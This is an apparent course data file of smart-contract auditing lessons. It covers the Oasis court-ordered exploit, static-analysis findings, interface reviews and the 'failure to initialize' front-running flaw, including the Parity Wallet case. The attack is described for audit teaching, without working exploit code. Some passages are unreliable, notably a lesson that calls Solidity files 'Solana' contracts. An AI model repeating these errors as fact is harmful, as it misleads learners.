          ![](https://cdn.videotap.com/TrlvVL07HW0fU9JmwRSw-26.17.png)

          All well and good until one day when a hacker sneaked in and made off with a sizeable amount of money - exactly 120K wrapped ether. Placing his stolen money in the Oasis application, the hacker probably felt quite pleased with himself. However, he didn't count on the steps that the victims of this hack would take next.

          ## Hacking Back the Hackers

          Understandably angered, the victims - who had substantial money sitting in the said protocol - turned to security researchers for assistance. The question was straightforward: Could a forced smart contract upgrade retrieve the stolen loot? To their relief, the answer was also straightforward: Yes.

          So next, they went to court armed with this new knowledge of an exploit in the Oasis' codebase. Their request was straightforward: Force the team behind Oasis to upgrade the protocol and utilize the exploit to match the hacker's play. Sounds wild, right? But it didn't just end there.

          ## A Court-Ordered Exploit

          The court agreed with these victims and ordered Oasis - yes, the same Oasis that professed decentralization and permissionless transactions - to upgrade their protocol and exploit their own security flaw. The objective was clear: retrieve the hacked funds, which, in essence, was hacking the hacker.

          > "The whole saga entailed coordination between the Oasis' founding team and the wormhole developer from Jump Crypto, the trading firm that had lost their money in the first place." - Extract from Blockworks Research Article.

          This was possible only because Oasis‚Äôs protocol wasn't truly decentralized or censorship-resistant. Had it been so, this court-ordered exploit couldn't have happened at all.

          ## The Conundrum of Centralization

          So was this a happy ending? Not everyone agrees. Yes, the stolen funds were recovered, but the image of Oasis as a truly decentralized platform took a hit. It revealed centralization risks creating a shift in how users see and interact with these types of platforms, as, generally, they are under the impression of these protocols being completely decentralized. As security researchers, we need to address such misleading aspects.

          Perhaps the takeaway from this episode is the importance of awareness and the possible loop-holes that may exist even in the most secure looking digital assets systems, and also that, despite the convenience and freedom, decentralized platforms can pose, there are hidden pitfalls.

          So the next time you're looking into using a new system or protocol, remember the story of the Oasis Protocol Hack Recovery. Not every 'decentralized' platform is truly what it claims to be. Be sure to read the information given, especially when it comes to security and understand the risks before committing your digital or physical assets. Be aware, and make a well-informed decision.

          Stay safe!
        description: 'Learn all about the Oasis court case and explore its significant implications in the DeFi ecosystem in this case study.'
      -
        id: 2d1c0adc-43ec-4577-8da5-e47ba2915f66
        type: new_lesson
        enabled: true
        title: 'Static Analysis Continued'
        slug: static-analysis-continued
        duration: 3
        video_url: 33fYTX8nWMzZ4ht4z9m00qfx9ogYtjL14J13bhZJtlv8
        raw_markdown_url: /routes/security/6-thunder-loan/14-static-analysis-continued/+page.md
        markdown_content: |-
          ---
          title: Static Analysis Continued
          ---



          ---

          # Identifying Key Aspects of a Blockchain Protocol Audit

          The process of a blockchain protocol audit involves numerous steps, including checking for null address errors or unused functions, and then reporting these findings. In this blog post, we will go through the transcript of such an audit, explaining the key steps and the reasons behind the auditors' actions.

          ## Addressing Null or Zero Address Errors

          The first thing on the agenda was identifying any zero address checks that were missing.

          While inspecting the code in `orible_upgradable.sol`, few aspects came to light that called for some auditing. In blockchain parlance, a zero address refers to an address that was never assigned. If any state variables in a smart contract were unintentionally assigned to a zero address, the contract may not function as intended.

          The code seemed to have a couple of places where this was an issue in assigning values to address state variables that lacked checks for address zero.

          An additional instance required our attention, further validating that multiple aspects of this contract require zero address checks. This recommendation came up as part of the audit's Informational findings or the 'Gas' that helps improve the contract's architecture.

          ## Marking Unused Functions as External

          The next point of attention was for functions that weren‚Äôt being used internally. These could be marked as external. Specifically, the `getAssetToken` function appeared to be a likely candidate for this change. It was found to be defined in `ThunderLoan.sol` but seemed to only be utilized in the `ThunderLoanUpgraded.sol` contract.

          ## Defining and Using Constants Instead of Literals

          Literals, in coding terms, are the set values that remain unaltered throughout the code's execution. Using constant variables instead of these literals enhance the code‚Äôs readability and maintainability.

          On Line 144 of the contract, the use of magic numbers was spotted. Magic numbers refer to undisguised numerical values that could potentially create confusion in the future. Therefore, defining and using constants instead of these literals is strongly advised.

          ## Track Missing Index Fields in Events

          Events play a crucial role in smart contracts, keeping a log of essential occurrences. Therefore, including an 'index field' is essential, as it aids in filtering and searching event logs effectively.

          In our project's case, some events being emitted lacked such an indexed field. Including this in the final report as an informational finding is a must, enabling the team to use events in a more structured and practical manner.

          # Evaluating Centralization Issue

          During our audit process, a centralization issue was identified with the protocol. It's a common practice in a private audit to notify the protocol if the contract is centralized. As highlighted in the Oasis case, an element of control or flexibility can potentially have dire consequences on protocol decentralization.

          "We found a centralization issue. We'd generally advise against this if the protocol doesn't need to be ownable or upgradable, as it presents a centralization vector."

          # Concluding Remarks

          Information gleaned from this audit demonstrates how intricately the process needs to be conducted. Key findings drawn during the process included missing zero-address checks, unused internal functions, usage of literals instead of constants, and missing index fields in events. Along with this, an important aspect brought forth was the issue related to centralization.

          It's vital to consider every possible attack vector when developing a protocol. By acknowledging potential risks, such as an unsuspecting bad actor gaining control and pilfering funds, we can make necessary adjustments to mitigate these risks.

          By running various audits like Slither or Adarin, we can close potential loopholes and aim to deliver a more streamlined, safe, and reliable protocol. These measures culminate in securing your protocol's integrity against potential risks, enhancing its potential for real-world utilization.
        description: 'Patrick continues to go through the findings of our static analysis tools: Slither & Aderyn.'
      -
        id: eff20578-d301-44a4-9a97-57140f7e19b5
        type: new_lesson
        enabled: true
        title: 'Recon IPoolFactory'
        slug: recon-ipoolfactory
        duration: 6
        video_url: 5d100hkLtDwSGLk4ibstw700fikz1RQ4T00c8Bj31rHfOA
        raw_markdown_url: /routes/security/6-thunder-loan/15-recon-ipoolfactory/+page.md
        markdown_content: |-
          ---
          title: Recon Manual Review IPoolFactory sol
          ---



          ---

          # Manual Code Review: Getting Started

          After setting our initial context and utilizing our suite of auditing tools, it's time to get our hands dirty with some thorough manual review. Much like our previous auditing process, one viable option available to us is to start from the test suite.

          ## Diving Into the Test Suites

          The project at hand features an invariant test suite, which, unfortunately, is rather redundant, hence ineffective. Additionally, there are some unit tests that warrant our attention. Consequently, an excellent first step is to run the `forge coverage` command to get an idea of the current test suite under scrutiny.

          ## Reviewing Test Coverage

          Our preliminary exploration reveals that the test coverage is unsatisfactory. Therefore, it's mute to map out our plan of action: We need to scrutinize this test suite, comprehend its shortcomings, infer the invariants, and consequently pen a robust invariant test suite. Afterward, all related findings would be relayed to the client‚Äîhighlighting their dire need to improve test coverage, expressed as an informal suggestion.

          Our last venture had us initially peering into their test suite and buffing it up. By taking this approach, revealing the hidden bugs was a breeze, and it seems likely that this strategy would prove beneficial once more. Nevertheless, this journey would also incorporate a thorough manual review.

          ## Focus on Proof of Code

          An essential part of the auditing process would involve digging deep into the provided code with a fine-toothed comb. While no single approach guarantees success, we'll be implementing the 'Tincho method' with considerably more gravity this time around.

          ### Workflow Setup with the Tincho Method

          Our journey begins in the SRC, using the `solidity metrics` command. The output would be copied in entirety and pasted into a document of choice. I personally prefer Google Sheets due to its easy to use interface and sorting abilities.

          ![](https://cdn.videotap.com/UrVcjpzYpZgiEY4KluYE-96.32.png)

          After eliminating any unnecessary columns, it is sensible to sort the code by size, in ascending order. This list forms the foundation of our audit, providing a linear path of progression from smaller contracts to larger ones.

          ### Mining the Code: Ifactory sol and ipoolfactory sol

          Using the Tincho method, we start by tackling the smallest contract: 'ifactory.sol'. The microscopic size may make it seem insignificant, but give it due diligence.

          Shortly after, 'ipoolfactory.sol' comes under scrutiny‚Äîthe first contract addressed in this session. Notably, this contract seems to interface with the T swap pool factory, as signified by the function 'get pool'.

          On closer inspection of the TSWAP code base, we can see that there is indeed a 'get pool' function present in the 'pool factory' ('poolfactory.sol').

          A useful annotation to consider:

          > 'ipoolfactory' is likely the interface used for communication with 'poolfactory.sol' from TSWAP.

          It would be beneficial to jot down these insights as an organized mind note or Google Sheets document, with sections such as 'About', 'Potential attack vectors', 'Ideas', and 'Questions'.

          A few starting points include:

          - Write about the protocol in your own words.
          - Why are we using TSWAP in this context?
          - How do flash loans correlate with this usage of TSWAP?

          This document acts as a brain dump, helping record initial thoughts, insights, and potential attack vectors. Maintaining an organized note system would likely make your work more efficient.

          At first glance, 'ifactory.sol' seems sound without any evident issues, which is a good sign. This quick win aligns with our ideology: to confirm the validity of the smaller parts before progressing onto larger sections.

          ## Keeping An Audit Trail

          Every reviewed snippet is ticked off, allowing us to keep track of our journey and ensure that ground covered is not tread twice.

          Our first milestone? 'ipoolfactory.sol': reviewed successfully.

          To improve our workflow, we could even factor in stages of review ('first pass', 'second pass', etc.). Our current initiative involves only a single comprehensive review to keep things simple.

          ## Wrapping It Up: First Review

          After this successful review of 'ipoolfactory.sol', we realise that the audited code interacts with an external contract: the pool factory. By understanding these relationships and ensuring the correctness of the smaller contracts, we're paving the way to a comprehensive project audit. Armed with keen eyes and perseverance, we're ready for our next task‚Äîbe it large or small.
        description: 'Patrick provides a walkthrough for conducting a first pass review of IPoolFactory.sol.'
      -
        id: b749f8e0-87f5-4e12-880d-8ecd81d5871b
        type: new_lesson
        enabled: true
        title: ITSwapPool.sol
        slug: itswappool
        duration: 2
        video_url: Sgp1kQyHpxrzWfP6dsnvyYG72fZN02tFxUwMU00D8Dd5A
        raw_markdown_url: /routes/security/6-thunder-loan/16-itswappool/+page.md
        markdown_content: |-
          ---
          title: ITSwapPool sol
          ---



          ---

          # Deep Dive into Tswappool.sol Interface

          One mystery that never loses its charm in the world of programming is the magic and intrigue of code reviews. It's an opportunity to navigate a labyrinth of ideas coded into existence, where the treasure isn't a particular conclusion, but a drive towards understanding and well, continuous improvement. In our expedition today, we're exploring the exciting realm of "Tswappool.sol".

          ## The Intriguing Interface of TSwapPool

          As we pulled up the "Tswappool.sol" file, it quickly became clear that the script was another interface in the ever-expansive Ethereum world, and the initial overview was rather promising.

          Here's a quick view into the key aspects of this interface:

          - `SPDX license Identifier`: Check. Good on this front.
          - `Pragma solidity`: All clear here.
          - `Interface TswapPool`: The main piece we're interested in.

          The structure and organization of the script were clean, effective, and up to standards at first glance, which adds a tick on the checklist.

          ### The Key Function: Get Price of One Pool Token in WETH

          The heart of any interface lies within the crucial functions it employs. In TswapPool, we uncover a singular but significant function - `getPriceOfOneTokenInWETH`.

          ![](https://cdn.videotap.com/AVRQTYRhhg4lDMb4rQM4-43.2.png)

          Using this function, the interface ends up working with TSWAP quite seamlessly. So kudos on the smart use of simplicity guided by functionality!

          #### But Why Only One Function?

          While everything else falls perfectly into place, a peculiar aspect emerges. The existence of only one function in the interface raises the question, "Why is the price of pool token in WETH the solitary functionality being implemented here?"

          > "Why is the `getPriceOfOneTokenInWETH` function the only one in this interface?"

          This question remains open-ended for now and forms an essential part of understanding and further exploring the purpose and design of this interface.

          ## It's a Check!

          Minus the above question, scrutinizing the 'Tswappool.sol' interface looks predominantly positive. Both the syntax and architecture of the coded script meet the expected standards.

          Living up to the 'Tincho method' philosophy, which advocates for the clarity and optimization of code, the TswapPool interface easily garners a big shiny check ‚úì!

          Indeed, code reviews especially with the Tincho method in our toolkit, feel deeply satisfying when met with such well-structured and cleanly scripted interfaces.

          As we come to the end of our review, remember that understanding scripts isn't just about putting checks on a list, but about appreciating the complexity coded into simplicity and the team spirit built into community standards.

          Reviewing the `Tswappool.sol` interface was a pleasure. Here's to many more engaging dives into the intriguing world of Ethereum and blockchain development!
        description: 'Patrick conducts a quick review on the surprisingly simple ITSwapPool.sol interface.'
      -
        id: 2fd9c1c0-5353-4d44-acd7-c33062f816e2
        type: new_lesson
        enabled: true
        title: IThunderLoan.sol
        slug: ithunderloan
        duration: 3
        video_url: 33VDcKF5DO2IS6By1z0100S017z99vM3DkWaEuH747NflI
        raw_markdown_url: /routes/security/6-thunder-loan/17-ithunderloan/+page.md
        markdown_content: |-
          ---
          title: IthunderLoan.sol
          ---



          ---

          # Unearthing Bugs and Enhancing Interfacing in ThunderLoan Protocol

          In the overlapping maze of smart contracts and blockchain protocols, it's critical not to miss any threads. You can uncover this through a methodical analysis of the mechanism layer by layer, as demonstrated with ThunderLoan protocol.

          ## Unraveling the ThunderLoan Contract

          The journey begins with taking a peek at the IThunderLoan interface we have been investigating. Here, the classic `ThunderLoan` contract caught my eye. As the usual procedure goes, we need to tackle a crucial question ‚Äì "Does `ThunderLoan` implement the `IThunderLoan`?"

          In this case, the `ThunderLoan` contract doesn't implement `IThunderLoan`. This might seem odd at first, but it could perhaps be an informational point from an auditing perspective. Intriguingly, the `IThunderLoan` interface should ideally be carried out by the `ThunderLoan` contract. An interface is a valuable tool in programming, it acts as a guideline to developers, ensuring that they don‚Äôt leave out any critical functions.

          Now, if the contract isn't implementing the interface, it's time to delve deeper into the details and discrepancies that might crop up in such cases. Let's compare the two closely and see if they're actually different.

          ![](https://cdn.videotap.com/Bft86JEs1cIqjxRo4BZq-39.92.png)## Scrutinizing the Repay Function

          Keeping a sharp focus on the `repay` function, we can see that it accepts a token, an address, and an amount. If we dig into the `IThunderLoan` interface, we notice this function takes an `IERC20` token and an address amount.

          Upon a detailed observation, this presents a peculiar situation ‚Äì the `IThunderLoan` and `ThunderLoan` contract parameters are not only different, but they contradict each other, creating grounds for an issue. Just imagine scenarios where the `repay` function is expecting an `IERC20` token, but it receives an address token; the resulting confusion could cause the process to break!

          Now, when we try to import the `IThunderLoan` and inherit it into `ThunderLoan` in Visual Studio Code, and if we save it, it says _"ThunderLoan should be marked abstract because it doesn't implement this `repay` function."_ This issue would have been caught easily if best practices had been followed and the auditing information had been put into use.

          Further, when the forge build is actioned, it doesn‚Äôt compile. This draws our attention back to the different parameters of the `repay` function.

          > "Stacking up both the interfaces side by side, in the `ThunderLoan` contract, the `repay` function is clutching an `IERC20` token and a `uint256`, whereas its counterpart ‚Äì `IThunderLoan` is nesting an address token and an amount."

          This makes it clear that these two are not singing in harmony, creating the need for amendments where necessary.

          ABOUT THE AUTHOR: This auditing journey showcases the significance of in-depth code investigation in contracts and interfaces. It provides insights into the potential complexities that might arise in coding and software development. It‚Äôs a concrete reminder of how seemingly insignificant details can crop up to create considerable confusion in function implementation and can carry far-reaching consequences if overlooked ‚Äì prominently, in smart contracts and blockchain protocols.

          ### Unraveling Code Rubrics, One Function at a Time

          It's time to retract the changes made and run some `command z's` to restore the code. Here lies an opportunity to leave a note to remind that the referenced interface should be implemented. This attention to detail can be tagged as either low or informational. These tags would depend on the possible future risks; it would probably be informational if the address token doesn't pose much of an issue. But it‚Äôs definitely something that demands further investigation.

          In essence, it‚Äôs crucial that accurate information is included in the report. So what at first glance looked like an odd piece of code, presented us with a whole other issue to dive into, and that's another feather in our problem-solving cap!

          Through this auditing adventure, we were able to uncover multiple discrepancies and enhance uniformity in the interfacing processes.

          Let‚Äôs keep this journey of code analysis ongoing - one function, one issue at a time. We may find the codebase exhausting at times, but as we unravel the layers, it's definitely rewarding for the meticulous code investigator.
        description: 'Patrick highlights inconsistencies between a Thunder Loan contract and its interface.'
      -
        id: 3f456769-0a89-4ae3-983f-f881a20e3d44
        type: new_lesson
        enabled: true
        title: IFlashloanReceiver.sol
        slug: flashloan-receiver
        duration: 7
        video_url: dpk00F5e5kJZmDdKrppCF1j9jyxzvx6SFe7J001M01oPRI
        raw_markdown_url: /routes/security/6-thunder-loan/18-flashloan-receiver/+page.md
        markdown_content: |-
          ---
          title: IFLashLoanReceiver.sol
          ---



          ---

          # Deep diving into Flash Loan Audits

          Going through audits especially when it involves assert checking can be a bit of a challenge even for seasoned programmers. Today, we will be looking into **IFlash Loan Receiver** contracts, finding out potential loopholes and code clean ups that we can perform to ensure our contract is as secure and tight-knit as possible.

          ![](https://cdn.videotap.com/nmh2iNPnadGsdWNfaTx7-13.81.png)## Understanding the Flash Loan receiver contracts

          A quick look at our code shows that we use a lot of import statements like `import IThunderLoan from ../IThunderLoan`. Now it might seem okay to import libraries and classes that we might not really use directly in our codebase, but there's reason to trim down on that. Let's delve in.

          While this line of code might seem harmless initially, closer inspection reveals that we don't really need to import this. Why is it there? One may think there could be an underpinning connection by another class or component. So let's try to find out where exactly this particular import is being utilized.

          Using the handy keyboard shortcut **Command Shift F** (or Control Shift F for Windows) in Visual Studio, we can quickly locate where `IFlashLoanReceiver` file is and where `IThunderLoan` is being imported.

          To our surprise, we found out that `IThunderLoan` isn't imported or used anywhere in the `IFlashLoanReceiver`. So it begs the question, why is it there?

          ## Cleaning Up Unused Imports

          While it's tempting to leave unused imports like this in your code (who knows, you might need it later, right?), this could be seen as bad practice in general. This is largely because it makes the code harder to read and understand, especially for new people coming onto the project and also, it could introduce potential security risks.

          We went ahead to comment out the `IThunderLoan` import to see if anything breaks. Running `forge build` in the terminal, we confirmed that, indeed, we didn't actually need this import.

          > **Note:** It's a fundamental principle of smart contract engineering to avoid altering live codes for test mocks. Hence we need to remove the import from `MockLoanReceiver.sol`.

          After removing the redundant import, our build is still in great shape, and we've made our project slightly cleaner and easier to understand.

          ## Exploring Flash Loan mechanics with Aave

          With the code cleaned up, we now shift focus to understanding some foundational concepts. Looking at the Flash Loan receiver contracts available on [Aave](https://github.com/aave), we realize that the implementation here is somewhat similar to what we have in our own codebase. The perfect opportunity to learn!

          Here's a snippet of the Aave code we were going through:

          ```js
          function executeOperation(address _reserve,uint256 _amount,uint256 _fee,bytes memory _params)external returns (bool);
          ```

          This part of the code piqued our curiosity. We came up with some assumptions about what each parameter might be doing:

          - `_reserve` could be the token being borrowed.
          - `_amount` probably is the amount of tokens.
          - `_fee` seems like it could be the fee of the Flash loan protocol.
          - `_params` could likely be the callback function.

          At this point, the code isn't elaborating on what these parameters are doing (a big shoutout to @audit for the Nat spec!), so we will need to do some more digging to find out.

          > **Quote:** "A big part of becoming proficient in contract auditing involves making well-educated guesses and then verifying those guesses."

          As we are going through the process, we find that the `executeOperation` is implemented in the `ThunderLoan.sol` which on running looks sufficiently secure.

          ## Wrapping Up and Taking Breaks

          With this deeper understanding, we actually managed to find some informationals that we can pass on to our client - which, at the end of the day is what it's all about: making the protocol safer, more successful, and better. And let's not forget, adhering to best practices in engineering.

          During this audit process, don't forget to take breaks! Applying the Pomodoro technique helps maintain focus, where one works for about 50 minutes and then takes a break for 5-10 minutes.

          **And there you have it, folks! Remember, keep your code clean, follow good engineering practices, and always, always remember to question everything. Happy auditing!**
        description: 'Learn the significance of checking for NATSPEC, reviewing code thoroughly, and understanding code structure for identifying possible vulnerabilities.'
      -
        id: 40862597-8a81-4c01-b2a7-8a316236b940
        type: new_lesson
        enabled: true
        title: OracleUpgradeable.sol
        slug: oracle-upgradeable
        duration: 5
        video_url: dScx48n2ImjtOfzadSAaazduEiHd00WBV5dyXUAJMLho
        raw_markdown_url: /routes/security/6-thunder-loan/19-oracle-upgradeable/+page.md
        markdown_content: |-
          ---
          title: OracleUpgradeable.sol
          ---



          ---

          # Understanding the Tincho Method: A Deep Dive into Solana Smart Contract

          In our previous discussion, we were introduced to the Tincho method. Thanks to its creator, Tincho, it gave us more confidence in creating our first Solana smart contract. Now, let's dive deeper into this journey and breakdown the necessities of preparing a Solana smart contract with a hand on codebase.

          ## A Look at the Codebase

          First, navigate to the Solana `.sol` file. It's our initial contract. It may seem small, but it's our first step into the universe of smart contracts. So let's explore what its components are. If you are not familiar with Solana or `.sol` files, you may find it easier to use 'Word Wrap' function to easily view the code.

          With the 'Word Wrap' enabled, we can see some keywords like `pragma` and `solidity`. There are also several imports, such as `it swap pool`, `Ipool factory`, and `initializable` which are being used within the same contract.

          ## The Role of Initializable

          Now, let's take a more in-depth look at the `initializable` package. It originates from OpenZeppelin, more specifically `OpenZeppelin contracts Upgradable`. As the name suggests, it aids in writing upgradable contracts and will be crucial to our understanding due to its role in proxy elements.

          > OpenZeppelin's `initializable` package plays a significant role in Solana smart contract creation. It makes it possible to construct complex contracts that are easily managed and upgradable. It is imperative to understand its functionality and how it interacts with other elements in the smart contract.

          ## Understanding Proxy in Solidity

          Now, let's navigate our way to Thunderloan.sol contract. Here, we will come across `Oracle Upgradable`, which is inherited into the main Thunderloan contract.

          The `Oracle Upgradable` contract is a part of the main `Thunderloan` contract. It's a base contract facilitating upgradable contracts or contracts deployed behind a proxy. To get more comfortable with this concept, it's important to understand proxies and their use in Solidity.

          If you take a look at the Nat spec (Natural Specification), you'll learn that upgradable contracts can't have constructors. The reason is, in an upgradable contract the storage is delegated to the proxy, but the logic resides in the implementation.

          Here is an important takeaway:

          > A contract's storage variables live in the proxy contract, while the contract logic lives in the implementation contract. Therefore, making use of constructors to initialize storage variables isn't applicable.

          In order to circumvent this issue, the `initializable` contract comes into play. Instead of constructors, you have initializer functions that help initialize proxies with storage. For instance, in OpenZeppelin contracts, you will find initializer functions signified as `__Init` and `__Initunchained`.

          ## Decoding Oracle Init

          Next, we have `Oracle Init` which is our initializer. It calls `Oracle Init Unchained` that takes a `pool factory address`, a `TSWAP address`, and another `pool factory address`.

          Our initializer function, `Oracle Init`, calls another function, `Oracle Init Unchained`. This function has a parameter `only initializing` which restricts the function to be called only one time.

          (Here's a piece of convention information: I suggest changing the name `TSWAP address` to `pool factory address` for better consistency. Just something to note if you are auditing the contract.)

          In simple terms, the entire setup here is to initialize the contract's state because we are using a proxy model where a constructor is not applicable. Now that we've successfully dived into the codebase and demystified key concepts, our Solana smart contract is ready for deployment!
        description: 'Learn the "Tincho" method for upgradeable contracts, highlighting proxies and initializable contracts without constructors.'
      -
        id: 4c23d2c2-a3c7-4303-b5a7-7e0736abb8df
        type: new_lesson
        enabled: true
        title: 'Exploit: Failure To Initialize'
        slug: failure-to-initialize
        duration: 3
        video_url: PBPuXLJ6QH7F75S7iVFz6FqctiT2TTVhE3TxkePo3fE
        raw_markdown_url: /routes/security/6-thunder-loan/20-failure-to-initialize/+page.md
        markdown_content: |-
          ---
          title: Exploit - Failure to Initialize
          ---



          ---

          # Unmasking a Major Pitfall in Smart Contracts: Initialization Vulnerability

          Hello code enthusiasts and blockchain fans! Today, I want to share with you my recent findings while perusing the Thunderloan smart contract. For the uninitiated, smart contracts are self-executing contracts that live on the blockchain. They are primarily used to enforce agreed-upon rules without requiring the presence of third parties.

          ## The Constructor in Smart Contracts

          Let's delve into a peculiar problem I've observed multiple times - particularly concerning initializers. As someone who has been doing this for quite a while, I've developed an instinct for catching certain risks. While examining Thunderloan's `initialize()` function, I knew I had stumbled upon an interesting issue.

          ![](https://cdn.videotap.com/OpjaMfHKQ2Zje0pNKhzI-13.95.png)

          Let's break down what an `initializer` is. This method is essentially replacing the traditional contract `constructor` as a setup function in contracts. It serves to initialize contract parameters when the contract is deployed.

          ## The Vulnerability: Front-running Initializers

          What could possibly go wrong with this, you may wonder? I'd like to pose a question: What if we deploy a contract and someone else gets to initialize it before we do? In other words, what if another person jumps the queue and sets the essential contract parameters prior to our initialization?

          This is akin to someone else picking up your rental car and setting the GPS addresses before you even get the keys!

          Taking this potential scenario into consideration, it becomes clear why 'initializers being front-run' have often been flagged in audits as low-risk vulnerabilities.

          ```
          audit('low', 'initializers can be front run');
          ```

          Imagine you have deployed a contract and forgotten to call the `initialize()` function. The scammer in our scenario notices this, exploits the vulnerability, and changes the `TSWAP` (Token Swap) address before you. The entire contract ends up being skewed towards this malicious user's benefit.

          ## The Result of the Attack

          So, what happens to the contract we just deployed? If the contract hasn't been initialized, it will likely malfunction or fail to work as smoothly as intended.

          For instance, within the Thunderloan contract, if the `SPoolFactory` (smart pool factory) is not initialized, the `getPrice()`, and `WETH()` function calls may instead invoke the Ethereum null address, leading to unexpected behavior.

          ```
          if (!initialized) {getPrice() --> address(0)WETH() --> address(0)}
          ```

          This scenario emphasizes the critical importance of ensuring initialization. Without it, the protocol ends up under-performing or in worse scenarios, completely breaks.

          ## Mitigation: Keeping it Tight and Right

          Identifying the problem is half the task. Knowing how to prevent it, however, is the real deal. How do we solve this initialization front-running problem in our contracts? It can be slightly tricky, and the best practice to ensure your contract's safety is actually quite simple - automate the initialization during deployment.

          By automatically calling the initialize function during deployment, developers can reduce the risk of forgetting to manually trigger it post-deployment. This tactic not only ensures that all contract parameters are set as soon as the contract is deployed, but it also provides a consistent testing and deployment flow.

          ## Conclusion

          Despite `initializers` being flagged as a low risk, they pose an architecture flaw that can easily be exploited if left unchecked. As blockchain developers, we need to not only write rock-solid smart contracts but ensure they're thoroughly tested and deployed without leaving potential loopholes for others to exploit.

          And to the auditors out there, next time you come across an `initializer`, remember:

          > "An initializer, though small, can cause great wreckage."
        description: 'Learn the importance of properly initializing during set up to prevent unauthorized changes to a protocol.'
      -
        id: 875535af-67e2-4d0f-9a4b-2a043ad2b20e
        type: new_lesson
        enabled: true
        title: 'Failure To Initialize: Remix'
        slug: failure-to-initialize-remix
        duration: 2
        video_url: Xh00ZispxghC01TQHMyym00026COmnCn5ygOKWvjKs81w4Y
        raw_markdown_url: /routes/security/6-thunder-loan/21-failure-to-initialize-remix/+page.md
        markdown_content: |-
          ---
          title: Exploit - Failure to Initialize - Remix Example
          ---

          ## Let's Play: Exploring the Issue in Remix

          [Remix](https://remix.ethereum.org/) et's compile and deploy a sample SC simulating the 'failure to initialize' flaw.

          ![](https://cdn.videotap.com/HhYH7vlvKZcgQ2YeBn5v-29.77.png)

          Following successful deployment, you will find several functions. Initiating the `initialize` function will initially return `false` since, with nothing preset, the value is logically zero.

          However, if we forget to officially initialize our variable and start incrementing the not-yet-existent element (say 4-5 times), it would start registering those values. We can then observe that my value has progressively increased with each increment, despite having no explicit initial value.

          Here's the kicker - if you now stumble upon the error and initialize the element (say, with 123), an anomaly occurs. Instead of adding to the increments, the value is completely overwritten with the initialized value. In our case, my value resets to 123, disregarding all prior increments.

          > **Note**: Remember that a correctly built `initialize` function should have protection against subsequent initializations, to prevent overwriting of any pre-existing data.

          ## Proactive Measures and Further Exploration

          The aforementioned problem can be prevented by ensuring initialization prior to interaction with a contract. This might seem insignificant, but in the world of coding, minor details can influence the major outcomes.

          Let's conclude with a suggestion - why not challenge yourself with the capture-the-flags exercise available on the repository? It might provide an interactive environment for understanding the problem better.

          To explore further on this issue, head back to the associated Github repository.

          And that's it folks, the overlooked yet crucial issue of 'Failure to Initialize' in the realm of SC exploits. I hope this post offers you meaningful insights and may your journey in the world of programming be devoid of such pitfalls!

          Happy Coding!
        description: 'Showcasing the failure to initialize vulnerability within Remix!'
      -
        id: 198f16fc-ba92-4b30-aa7d-74d507193315
        type: new_lesson
        enabled: true
        title: 'Case Study: Failure To Initialize'
        slug: failure-to-initialize-case-study
        duration: 3
        video_url: qEZ600bi01W3vprQBwXGT101w2LAsgKvl01bZzjS028JHgtQ
        raw_markdown_url: /routes/security/6-thunder-loan/22-failure-to-initialize-case-study/+page.md
        markdown_content: |-
          ---
          title: Exploit - Failure to Initialize - Case Study
          ---

          # Failure to Initialize: A Lesson from Smart Contract Exploits

          If you've ever dabbled in the realm of smart contracts, you may be familiar with an infamous exploit called "Failure to Initialize." This notorious event unfolded in the Web Three Ethereum Ecosystem, involving a GitHub issue that potentially devastated the contract behind the Parity Wallet. It serves as a harsh reminder to all smart contract developers to initialize their contracts properly, or risk catastrophic failure.

          In this blog post, we'll dissect the event and analyze the lessons learned. This way, we aim to prevent a similar misstep from reoccurring in our own projects or those of others.

          ## The Initial Issue

          ![](https://cdn.videotap.com/OY6Xn3YTnnAcgF4AnFtX-17.09.png)The tale starts with an innocent-looking [Git issue](https://github.com/paritytech/parity-ethereum/issues/6995) submitted to the Parity Wallet. Someone had unintentionally "killed" the contract - a possibility they were unaware of until it happened. This shocking event triggered a cascade of errors that brought to light a serious vulnerability in the smart contract.

          The Etherscan transaction associated with it confirms the event. When we navigate down to the transaction details, click "Show more," and decode the input data, we can see the parameters they entered when they accidentally invoked the contract's kill function.

          The user was merely experimenting with the contract ‚Äî not anticipating that their "play" would cause such devastation. They had overlooked a significant precaution in the preparation: initializing their initializer function.

          Tragically, the initializer, which was initially neglected, was later invoked. This act inadvertently caused the breakdown of a contract hosting a considerable sum. It's a tale that triggers despair among developers and serves as a potent reminder: **Never forget to initialize your contracts**.

          > "Initialize your initializers. This might seem like a simple step, but one oversight can cause catastrophic consequences for your contracts."

          ## Lessons You Should Carry

          What enlightenment can we glean from this unfortunate event? Well, it screams out the need for initialization. It also raises questions about potential methods to ensure initialization is never omitted, like incorporating it into a deployment script or implementing a parameter that blocks the rest of the system from interacting until initialization has occurred.

          While we are discussing potential solutions, it is crucial to note that merely attaching a ‚ÄúonlyInitialized‚Äù modifier to functions won‚Äôt cut it. This strategy is often ignored by developers who are looking to save on gas fees. However, the primary concern here is to guarantee initialization, irrespective of how it is achieved.

          In the dissected smart contract, there were no blockers placed to prevent interaction with the contract until initialization was complete. This absence is a glaring shortfall needing rectification.

          Remember, **initialization can be front-run**. It's vital you put mechanisms in place to prevent such actions from happening, which might wreak havoc akin to the Parity Wallet incident.

          ## Remember This Tale

          This event, classified under the infamous hack, is widely known as "Failure to Initialize". To avoid facing this unfortunate situation, get familiar with the case study, and make sure to initialize your initializers appropriately.

          With the constant evolution of the Ethereum ecosystem, it's crucial to learn from our predecessors' missteps. Let this serve as a lesson to you: Pay attention to initializations, or you might accidentally "kill" something you didn't intend to.

          The dark tale of this smart contract mishap should remain a beacon guiding you away from similar pitfalls. It's a call to ensure attentive and thorough development processes, bearing in mind that one small oversight can lead to the interruption of an entire system.

          > "Even the smallest oversight in a contract can lead to the destruction of the entire protocol. Understanding the importance of the initialization steps is critical. Remember, don't let a similar fate befall your contracts."

          And lastly, let the grim tale of "Failure to Initialize" remind you: it's wiser to prevent than lament.
        description: 'Dive into the Parity Wallet case study on the consequences of failing to initialize.'
      -
        id: 0436b816-136a-46c2-9614-c8ce9483128b
        type: new_lesson
        enabled: true
        title: 'OracleUpgradeable Continued'
        slug: oracleupgradeable-continued
        duration: 4
        video_url: vnQoMafObsu1DgT01laAf0102BcTD88d6AV5DYH2BCz5Qg
        raw_markdown_url: /routes/security/6-thunder-loan/23-oracleupgradeable-continued/+page.md
        markdown_content: |-
          ---
          title: OracleUpgradeable.sol (Continued)
          ---

          # Oracle Upgradable: A Thorough Review

          Welcome back, Code Critiques! We‚Äôre continuing our journey through the world of blockchain programming and today, we're examining the Oracle Upgradable back-end.

